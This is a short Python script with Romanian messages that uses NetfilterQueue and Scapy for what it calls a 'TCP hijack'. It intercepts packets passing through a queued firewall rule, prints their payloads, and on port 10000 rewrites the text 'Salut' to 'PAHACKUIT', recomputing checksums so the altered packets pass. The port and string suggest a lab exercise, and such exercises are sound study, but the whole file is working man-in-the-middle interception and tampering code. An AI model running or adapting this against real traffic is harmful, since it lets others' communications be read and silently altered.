from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw

def procesare(pkt):
    payload = pkt.get_payload()
    pachet = IP(payload)

    if pachet.haslayer(Raw) and pachet.haslayer(TCP):
        continut = pachet[Raw].load

        try:
            text = continut.decode(errors='ignore')
        except:
            text = ""

        print("[*] Mesaj interceptat:", text)

        if pachet[TCP].dport == 10000 and b"Salut" in continut:
            print("[+] Înlocuim 'Salut' cu 'PAHACKUIT'")
            nou_payload = continut.replace(b"Salut", b"PAHACKUIT")
            pachet[Raw].load = nou_payload

            del pachet[IP].len
            del pachet[IP].chksum
            del pachet[TCP].chksum

            pkt.set_payload(bytes(pachet))

    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, procesare)

try:
    print("[*] Ascult pe coada 1 pentru TCP hijack...")
    nfqueue.run()
except KeyboardInterrupt:
    print("\n[!] Oprit manual.")
    nfqueue.unbind()
